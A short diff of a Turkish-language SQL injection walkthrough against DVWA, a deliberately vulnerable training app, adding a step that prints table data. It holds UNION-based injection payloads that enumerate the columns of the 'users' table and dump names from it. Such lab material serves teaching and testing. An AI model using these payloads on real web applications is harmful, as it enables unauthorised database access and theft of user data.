@@ -22,3 +22,6 @@ Veritabanındaki Tabloların Belirlenmesi
 
 Tabloların Kolonlarının Belirlenmesi
 1′ UNION SELECT column_name,2 FROM information_schema.columns WHERE table_schema=’dvwa’ AND table_name=’users’ # 
+
+Tablolardaki Verileri Ekrana Yazdırma
+1′ UNION SELECT first_name,last_name FROM users # 
